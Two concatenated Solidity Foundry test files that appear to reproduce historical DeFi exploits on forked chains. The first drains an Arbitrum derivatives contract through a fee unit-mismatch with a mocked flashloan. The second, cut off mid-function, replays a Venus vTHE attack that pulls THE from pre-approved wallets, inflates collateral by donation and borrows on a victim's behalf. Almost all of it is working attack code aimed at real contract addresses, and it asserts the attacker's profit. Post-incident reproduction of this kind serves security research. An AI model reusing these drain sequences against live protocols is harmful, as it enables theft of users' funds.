contract ContractTest is Test {
    uint256 internal constant ATTACK_BLOCK = 419_829_771;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;
    uint256 internal constant ATTACK_TIMESTAMP = 1_768_033_835;

    address internal constant VICTIM_PROXY = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;

    address internal constant USDCe = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant AAVE_USDC_ATOKEN = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;

	function setUp() public {
        vm.createSelectFork("arbitrum", FORK_BLOCK);
        vm.roll(ATTACK_BLOCK);
        vm.warp(ATTACK_TIMESTAMP);

        vm.label(VICTIM_PROXY, "VictimProxy");
        vm.label(USDCe, "USDCe");
        vm.label(WETH, "WETH");
        vm.label(AAVE_USDC_ATOKEN, "Aave_aUSDC");

	}

	function testFutureSwapDrain() public {
        address attackerEOA = address(0x00000000000000000000000000000000BEeFbEef);
        vm.label(attackerEOA, "AttackerEOA");
        vm.deal(attackerEOA, 1 ether);

        // Foundry EVM does not always execute L2-deployed Aave pools reliably across all environments.
        // This harness reproduces the flashloan *shape* (loan -> callback -> pull repayment) without depending on Aave internals.
        MockAaveV3Pool mockAave = new MockAaveV3Pool();
        vm.label(address(mockAave), "MockAaveV3Pool");
        vm.startPrank(AAVE_USDC_ATOKEN);
        IERC20(USDCe).transfer(address(mockAave), 500_250e6);
        vm.stopPrank();

        uint256 attackerUsdcBefore = IERC20(USDCe).balanceOf(attackerEOA);
        uint256 victimUsdcBefore = IERC20(USDCe).balanceOf(VICTIM_PROXY);
        uint256 victimWethBefore = IERC20(WETH).balanceOf(VICTIM_PROXY);

        console.log("=== PoC: Fee unit-mismatch drain (Arbitrum) ===");
        console.log("fork block", FORK_BLOCK);
        console.log("attack block", ATTACK_BLOCK);
        console.log("attack timestamp", ATTACK_TIMESTAMP);
        console.log("pre: attacker USDC", attackerUsdcBefore);
        console.log("pre: victim USDC", victimUsdcBefore);
        console.log("pre: victim WETH", victimWethBefore);

        vm.startPrank(attackerEOA);
        AttackContract attacker = new AttackContract(attackerEOA, address(mockAave), USDCe, VICTIM_PROXY);
        attacker.start(500_000e6);
        vm.stopPrank();

        uint256 attackerUsdcAfter = IERC20(USDCe).balanceOf(attackerEOA);
        uint256 victimUsdcAfter = IERC20(USDCe).balanceOf(VICTIM_PROXY);
        uint256 victimWethAfter = IERC20(WETH).balanceOf(VICTIM_PROXY);

        console.log("post: attacker USDC", attackerUsdcAfter);
        console.log("post: victim USDC", victimUsdcAfter);
        console.log("post: victim WETH", victimWethAfter);
        console.log("delta: attacker USDC", attackerUsdcAfter - attackerUsdcBefore);
        console.log("delta: victim USDC", int256(victimUsdcAfter) - int256(victimUsdcBefore));
        console.log("delta: victim WETH", int256(victimWethAfter) - int256(victimWethBefore));

        require(attackerUsdcAfter > attackerUsdcBefore, "no attacker USDC profit");
        require(attackerUsdcAfter - attackerUsdcBefore == 394_742_852_305, "unexpected attacker profit");

        require(victimUsdcAfter == 0, "unexpected victim USDC final");
        require(victimWethAfter == 32_278_351_334_263_579_577, "unexpected victim WETH final");

	}

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

}

interface IAaveV3Pool {
	function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode

			) external;

}

interface IFlashLoanSimpleReceiver {
	function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params

			) external returns (bool);

}

contract PositionCaller {
    address public immutable victim;
    IERC20 public immutable usdc;

	constructor(address victim_, address usdc_) {
        victim = victim_;
        usdc = IERC20(usdc_);
        usdc.approve(victim_, type(uint256).max);

	}

	function changePosition(int256 deltaAsset, int256 deltaStable, int256 stableBound) external {
        console.log("  -> PositionCaller.changePosition()");
        console.log("     caller", address(this));
        console.log("     deltaAsset", deltaAsset);
        console.log("     deltaStable", deltaStable);
        (bool ok, bytes memory data) =
            victim.call(abi.encodeWithSelector(bytes4(0xa442c8be), deltaAsset, deltaStable, stableBound));
        require(ok, _revertMsg(data));

	}

	function sweep(address to) external {
        uint256 bal = usdc.balanceOf(address(this));
		if (bal != 0) {
            usdc.transfer(to, bal);

		}

	}

	function _revertMsg(bytes memory data) private pure returns (string memory) {
        if (data.length < 4) return "victim call reverted";
        return "victim call reverted";

	}

}

contract OpenPositionDrainer {
    address public immutable victim;
    IERC20 public immutable usdc;

	constructor(address victim_, address usdc_) {
        victim = victim_;
        usdc = IERC20(usdc_);
        usdc.approve(victim_, type(uint256).max);

	}

	function openPosition() external {
        console.log("  -> OpenPositionDrainer.openPosition()");
        console.log("     opener", address(this));
		(bool ok, bytes memory data) = victim.call(
            abi.encodeWithSelector(bytes4(0xa442c8be), int256(uint256(0.1 ether)), int256(uint256(1_000e6)), 0)

				);
        require(ok, _revertMsg(data));

	}

	function drainTo(address to) external {
        console.log("  -> OpenPositionDrainer.drainTo()");
        console.log("     opener", address(this));
        console.log("     to", to);

        // Observed in original tx: victim was called with changePosition(0, -894_992_852_305, 0),
        // then transferred 894,992.852305 USDC.e to the drainer.
        (bool ok, bytes memory data) =
            victim.call(abi.encodeWithSelector(bytes4(0xa442c8be), int256(0), int256(-894_992_852_305), 0));
        require(ok, _revertMsg(data));

        uint256 bal = usdc.balanceOf(address(this));
        console.log("     opener USDC after drain", bal);
        if (bal != 0) usdc.transfer(to, bal);

	}

	function _revertMsg(bytes memory data) private pure returns (string memory) {
        if (data.length < 4) return "victim call reverted";
        return "victim call reverted";

	}

}

contract AttackContract is IFlashLoanSimpleReceiver {
    address public immutable owner;
    IAaveV3Pool public immutable aavePool;
    IERC20 public immutable usdc;
    address public immutable victim;

    address private constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

    OpenPositionDrainer public opener;
    PositionCaller public callerBigFee;
    PositionCaller public callerTiny;

	constructor(address owner_, address aavePool_, address usdc_, address victim_) {
        owner = owner_;
        aavePool = IAaveV3Pool(aavePool_);
        usdc = IERC20(usdc_);
        victim = victim_;

	}

	function start(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        console.log("AttackContract.start()");
        console.log("  owner", owner);
        console.log("  victim", victim);
        console.log("  amount (USDCe)", amount);
        aavePool.flashLoanSimple(address(this), address(usdc), amount, "", 0);

	}

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool)
		{
        asset;
        initiator;
        params;
        require(msg.sender == address(aavePool), "not aave pool");

        console.log("executeOperation()");
        console.log("  asset", asset);
        console.log("  amount", amount);
        console.log("  premium", premium);
        console.log("  initiator", initiator);
        _logBalances("  balances: begin");

        console.log("Step 1: victim.updateFunding()");
        (bool ok,) = victim.call(abi.encodeWithSelector(bytes4(0x1ebf4eb5)));
        require(ok, "updateFunding failed");

		if (address(opener) == address(0)) {
            opener = new OpenPositionDrainer(victim, address(usdc));
            callerBigFee = new PositionCaller(victim, address(usdc));
            callerTiny = new PositionCaller(victim, address(usdc));
            console.log("Step 2: deployed helper contracts");
            console.log("  opener", address(opener));
            console.log("  callerBigFee", address(callerBigFee));
            console.log("  callerTiny", address(callerTiny));

		}

        console.log("Step 3a: openPosition seed (1000 USDCe)");
        usdc.transfer(address(opener), 1_000e6);
        opener.openPosition();
        _logBalances("  balances: after openPosition");

        console.log("Step 3b: big-fee seed (2000 USDCe, 0.324678582642240534 WETH)");
        usdc.transfer(address(callerBigFee), 2_000e6);
        callerBigFee.changePosition(int256(uint256(324678582642240534)), int256(uint256(2_000e6)), 0);
        _logBalances("  balances: after big-fee seed");

        console.log("Step 3c: tiny seed (500 USDCe, 0.001 WETH)");
        usdc.transfer(address(callerTiny), 500e6);
        callerTiny.changePosition(0.001 ether, int256(uint256(500e6)), 0);
        _logBalances("  balances: after tiny seed");

        console.log("Step 4: main changePosition (-68 WETH, 496500 USDCe)");
        usdc.approve(victim, type(uint256).max);
        (ok,) = victim.call(abi.encodeWithSelector(bytes4(0xa442c8be), int256(-68 ether), int256(uint256(496_500e6)), 0));
        require(ok, "main changePosition failed");
        _logBalances("  balances: after main changePosition");

        console.log("Step 5: drainTo (changePosition(0, -894992.852305 USDCe, 0))");
        opener.drainTo(address(this));
        _logBalances("  balances: after drainTo");

        console.log("Step 6: sweep helper leftovers");
        callerBigFee.sweep(address(this));
        callerTiny.sweep(address(this));
        _logBalances("  balances: after sweeps");

        uint256 repay = amount + premium;
        console.log("Step 7: repay");
        console.log("  repay (amount+premium)", repay);
        usdc.approve(address(aavePool), repay);

        uint256 bal = usdc.balanceOf(address(this));
        console.log("  attacker contract USDC before repay", bal);
        require(bal >= repay, "insufficient to repay (attack not reproduced)");
        uint256 profit = bal - repay;
        console.log("  profit (USDC)", profit);
        if (profit != 0) usdc.transfer(owner, profit);
        _logBalances("  balances: end");
        return true;

		}

	function _logBalances(string memory tag) private view {
        console.log(tag);
        console.log("    attacker_contract USDC", usdc.balanceOf(address(this)));
        console.log("    victim USDC", usdc.balanceOf(victim));
        console.log("    victim WETH", IERC20(WETH).balanceOf(victim));

	}

}

contract MockAaveV3Pool is IAaveV3Pool {
	function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode

		) external {
        params;
        referralCode;

        uint256 premium = amount * 5 / 10_000; // 0.05% (matches 500,000e6 -> 250e6)
        IERC20(asset).transfer(receiverAddress, amount);

        bool ok = IFlashLoanSimpleReceiver(receiverAddress).executeOperation(asset, amount, premium, msg.sender, "");
        require(ok, "executeOperation failed");

        IERC20(asset).transferFrom(receiverAddress, address(this), amount + premium);

	}

}

// SPDX-License-Identifier: UNLICENSED
// @KeyInfo - Total Lost : still held as raw CAKE + WBNB at the end of the tx
// Attacker : https://bscscan.com/address/0x43C743e316F40d4511762EEdf6f6D484F67b2F82
// Attack Contract : https://bscscan.com/address/0x737bc98F1D34E19539C074B8Ad1169d5d45dA619
// Attack Tx : https://bscscan.com/tx/0x4f477e941c12bbf32a58dc12db7bb0cb4d31d41ff25b2457e6af3c15d7f5663f

// Trace-driven state changing path:
// 1. Drain THE from six EOAs that had pre-approved the future attack-contract address.
// 2. Donate those THE directly into Venus vTHE to inflate the market's exchange rate / collateral value.
// 3. Use Venus borrowBehalf to borrow USDC onto a victim's debt while sending the cash to the attacker.
// 4. Mint vUSDC with the stolen USDC, enter that market, then borrow THE and donate it back into vTHE.
// 5. Reuse the victim's now-overvalued vTHE collateral to borrow CAKE and WBNB on the victim's behalf.

pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
}

interface IVenusComptrollerLike {
    function enterMarkets(
        address[] calldata vTokens
    ) external returns (uint256[] memory);
}

interface IVenusVTokenLike {
    function mint(
        uint256 mintAmount
    ) external returns (uint256);
    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
    function borrowBehalf(
        address borrower,
        uint256 borrowAmount
    ) external returns (uint256);
    function borrowBalanceStored(
        address account
    ) external view returns (uint256);
}

interface IEtchedAttackEntry {
    function attack() external;
}


contract Venus_vTHE_BorrowBehalf_Test is Test {
    string internal constant BSC_ARCHIVE_RPC = "https://bsc-mainnet.public.blastapi.io";

    address internal constant ATTACKER_EOA = 0x43C743e316F40d4511762EEdf6f6D484F67b2F82;
    address internal constant ATTACK_CONTRACT = 0x737bc98F1D34E19539C074B8Ad1169d5d45dA619;
    address internal constant VICTIM = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;

    uint256 internal constant ATTACK_BLOCK = 86_731_941;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;

    uint256 internal constant THE_DONATION_TOTAL = 36_096_716_105_623_166_306_174_220;
    uint256 internal constant USDC_BORROW_AMOUNT = 1_581_454_956_604_046_563_770_845;
    uint256 internal constant THE_SELF_BORROW_AMOUNT = 4_628_903_900_747_323_154_634_598;
    uint256 internal constant CAKE_BORROW_AMOUNT = 913_858_263_360_521_396_654_198;
    uint256 internal constant WBNB_BORROW_AMOUNT = 1_972_530_910_582_753_621_682;

    IERC20Minimal internal constant USDC = IERC20Minimal(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20Minimal internal constant THE = IERC20Minimal(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
    IERC20Minimal internal constant CAKE = IERC20Minimal(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20Minimal internal constant WBNB = IERC20Minimal(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IVenusComptrollerLike internal constant COMPTROLLER =
        IVenusComptrollerLike(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVenusVTokenLike internal constant VUSDC = IVenusVTokenLike(0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8);
    IVenusVTokenLike internal constant VTHE = IVenusVTokenLike(0x86e06EAfa6A1eA631Eab51DE500E3D474933739f);
    IVenusVTokenLike internal constant VCAKE = IVenusVTokenLike(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    IVenusVTokenLike internal constant VWBNB = IVenusVTokenLike(0x6bCa74586218dB34cdB402295796b79663d816e9);

    function setUp() public {
        vm.createSelectFork(BSC_ARCHIVE_RPC, FORK_BLOCK);

        vm.label(ATTACKER_EOA, "attacker EOA");
        vm.label(ATTACK_CONTRACT, "historical attack contract");
        vm.label(VICTIM, "victim");
        vm.label(address(COMPTROLLER), "Venus Comptroller");
        vm.label(address(USDC), "USDC");
        vm.label(address(THE), "THENA");
        vm.label(address(CAKE), "CAKE");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(VUSDC), "vUSDC");
        vm.label(address(VTHE), "vTHE");
        vm.label(address(VCAKE), "vCAKE");
        vm.label(address(VWBNB), "vWBNB");
    }

    function testTraceDrivenPoC() public {
        assertEq(ATTACK_CONTRACT.code.length, 0, "attack contract should not exist before the creation tx");

        uint256 attackerCakeBefore = CAKE.balanceOf(ATTACK_CONTRACT);
        uint256 attackerWbnbBefore = WBNB.balanceOf(ATTACK_CONTRACT);
        uint256 vTheCashBefore = THE.balanceOf(address(VTHE));
        uint256 victimUsdcDebtBefore = VUSDC.borrowBalanceStored(VICTIM);
        uint256 victimCakeDebtBefore = VCAKE.borrowBalanceStored(VICTIM);
        uint256 victimWbnbDebtBefore = VWBNB.borrowBalanceStored(VICTIM);

        VenusVtheBorrowBehalfRuntime template = new VenusVtheBorrowBehalfRuntime();
        vm.etch(ATTACK_CONTRACT, address(template).code);

        vm.prank(ATTACKER_EOA);
        IEtchedAttackEntry(ATTACK_CONTRACT).attack();

        uint256 attackerCakeAfter = CAKE.balanceOf(ATTACK_CONTRACT);
        uint256 attackerWbnbAfter = WBNB.balanceOf(ATTACK_CONTRACT);

        emit log_named_decimal_uint("attack contract CAKE before", attackerCakeBefore, 18);
        emit log_named_decimal_uint("attack contract CAKE after", attackerCakeAfter, 18);
        emit log_named_decimal_uint("attack contract CAKE profit", attackerCakeAfter - attackerCakeBefore, 18);
        emit log_named_decimal_uint("attack contract WBNB before", attackerWbnbBefore, 18);
        emit log_named_decimal_uint("attack contract WBNB after", attackerWbnbAfter, 18);
        emit log_named_decimal_uint("attack contract WBNB profit", attackerWbnbAfter - attackerWbnbBefore, 18);

        assertEq(attackerCakeAfter, CAKE_BORROW_AMOUNT, "unexpected CAKE profit");
        assertEq(attackerWbnbAfter, WBNB_BORROW_AMOUNT, "unexpected WBNB profit");
        assertGe(
            VUSDC.borrowBalanceStored(VICTIM) - victimUsdcDebtBefore,
            USDC_BORROW_AMOUNT,
            "victim USDC debt did not increase enough"
        );
        assertGe(
            VCAKE.borrowBalanceStored(VICTIM) - victimCakeDebtBefore,
            CAKE_BORROW_AMOUNT,
            "victim CAKE debt did not increase enough"
        );
        assertGe(
            VWBNB.borrowBalanceStored(VICTIM) - victimWbnbDebtBefore,
            WBNB_BORROW_AMOUNT,
            "victim WBNB debt did not increase enough"
        );
        assertEq(THE.balanceOf(address(VTHE)) - vTheCashBefore, THE_DONATION_TOTAL, "unexpected THE donated into vTHE");
    }
}

contract VenusVtheBorrowBehalfRuntime {
    address internal constant VICTIM = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;

    IERC20Minimal internal constant USDC = IERC20Minimal(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20Minimal internal constant THE = IERC20Minimal(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);

    IVenusComptrollerLike internal constant COMPTROLLER =
        IVenusComptrollerLike(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVenusVTokenLike internal constant VUSDC = IVenusVTokenLike(0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8);
    IVenusVTokenLike internal constant VTHE = IVenusVTokenLike(0x86e06EAfa6A1eA631Eab51DE500E3D474933739f);
    IVenusVTokenLike internal constant VCAKE = IVenusVTokenLike(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    IVenusVTokenLike internal constant VWBNB = IVenusVTokenLike(0x6bCa74586218dB34cdB402295796b79663d816e9);

    uint256 internal constant USDC_BORROW_AMOUNT = 1_581_454_956_604_046_563_770_845;
    uint256 internal constant THE_SELF_BORROW_AMOUNT = 4_628_903_900_747_323_154_634_598;
    uint256 internal constant CAKE_BORROW_AMOUNT = 913_858_263_360_521_396_654_198;
    uint256 internal constant WBNB_BORROW_AMOUNT = 1_972_530_910_582_753_621_682;

    function attack() external {
        _donateVictimApprovedTHE();

        require(VUSDC.borrowBehalf(VICTIM, USDC_BORROW_AMOUNT) == 0, "vUSDC borrowBehalf failed");
        require(USDC.approve(address(VUSDC), USDC_BORROW_AMOUNT), "USDC approve failed");
        require(VUSDC.mint(USDC_BORROW_AMOUNT) == 0, "vUSDC mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(VUSDC);
        uint256[] memory enterResults = COMPTROLLER.enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enterMarkets failed");

        require(VTHE.borrow(THE_SELF_BORROW_AMOUNT) == 0, "vTHE borrow failed");
        require(THE.transfer(address(VTHE), THE_SELF_BORROW_AMOUNT), "THE self-donation failed");

        require(VCAKE.borrowBehalf(VICTIM, CAKE_BORROW_AMOUNT) == 0, "vCAKE borrowBehalf failed");
        require(VWBNB.borrowBehalf(VICTIM, WBNB_BORROW_AMOUNT) == 0, "vWBNB borrowBehalf failed");
    }

    function _donateVictimApprovedTHE() internal {
        require(
            THE.transferFrom(
                0xf052219F767612C411C9fE4a0F334237429c58AA, address(VTHE), 13_223_597_895_594_033_973_515_042
            ),
            "THE donor 0 failed"
        );
        require(
            THE.transferFrom(
                0x89E3615F356B3b40aCB2f8598117EAB1aFfddDB6, address(VTHE), 9_474_403_025_851_589_299_769_076
            ),
            "THE donor 1 failed"
        );
        require(
            THE.transferFrom(
                0xbb3782048735091AB4C304693a69371965A4ef87, address(VTHE), 7_532_701_864_690_234_166_374_687
            ),
            "THE donor 2 failed"
        );
        require(
            THE.transferFrom(
                0x564A073Fa4cfa81C2c882168fA760A88b82A4591, address(VTHE), 3_915_245_257_789_590_760_859_160
            ),
            "THE donor 3 failed"
        );
        require(THE.transferFrom(VICTIM, address(VTHE), 697_951_336_338_781_512_460_490), "THE donor 4 failed");
